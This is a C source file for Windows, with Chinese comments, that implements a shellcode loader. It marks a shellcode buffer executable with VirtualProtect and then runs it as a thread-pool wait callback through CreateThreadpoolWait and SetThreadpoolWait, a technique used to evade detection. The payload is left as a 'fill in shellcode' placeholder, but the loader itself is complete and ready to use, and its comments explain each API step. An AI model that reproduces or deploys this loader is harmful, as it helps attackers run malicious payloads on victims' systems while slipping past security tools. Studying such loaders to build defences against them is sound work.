#include <stdio.h>
#include <Windows.h>

unsigned char shellcode[] = "填写shellcode";

void ThreadPoolLoader() {
    // 定义一个DWORD变量，用于存储原始内存保护属性
    DWORD oldProtect;

    // 修改shellcode所在内存的保护属性为可读、可写、可执行
    VirtualProtect((LPVOID)shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &oldProtect);

    // 创建一个事件对象，初始状态为有信号状态，使用默认安全属性，非手动重置，无名称
    HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);

    /*
    CreateThreadpoolWait用于创建一个线程池等待对象的函数,
    程池等待对象允许您在等待内核对象（如事件、信号量等）变为有信号状态时执行特定的回调函数
    其语法格式如下:
    PTP_WAIT CreateThreadpoolWait(
      PTP_WAIT_CALLBACK pfnwa,  //指向回调函数的指针
      PVOID              pv,   //传递给回调函数的参数
      PTP_CALLBACK_ENVIRON pcbe  //指向线程池回调环境的指针,置NULL则表示使用默认的环境
    );
    */
    // 创建一个线程池等待对象，关联到shellcode作为回调函数，回调函数参数和线程池环境为NULL
    PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)(LPVOID)shellcode, NULL, NULL);


    /*
    SetThreadpoolWait函数用于线程池中添加等待对象的函数。
    当等待的内核对象（如事件、信号量等）变为有信号状态时，线程池会调用与等待对象关联的回调函数
    其语法格式如下:
    VOID SetThreadpoolWait(
      PTP_WAIT pwa,  //指向要添加到线程池的等待对象的指针
      HANDLE   hObject,  //要等待的内核对象的句柄,当这个内核对象变为有信号状态时,线程池会调用与等待对象关联的回调函数
      PFILETIME pftTimeout  //指向一个FILETIME结构的指针，表示等待超时的时间
    );
    */
    // 将等待对象添加到线程池中,当事件对象event触发（变为有信号状态）时，线程池会调用与threadPoolWait关联的回调函数
    SetThreadpoolWait(threadPoolWait, event, NULL);

    // 等待事件对象变为无信号状态（表示shellcode执行完毕），无限等待
    WaitForSingleObject(event, INFINITE);
}

void main() {
    ThreadPoolLoader();
}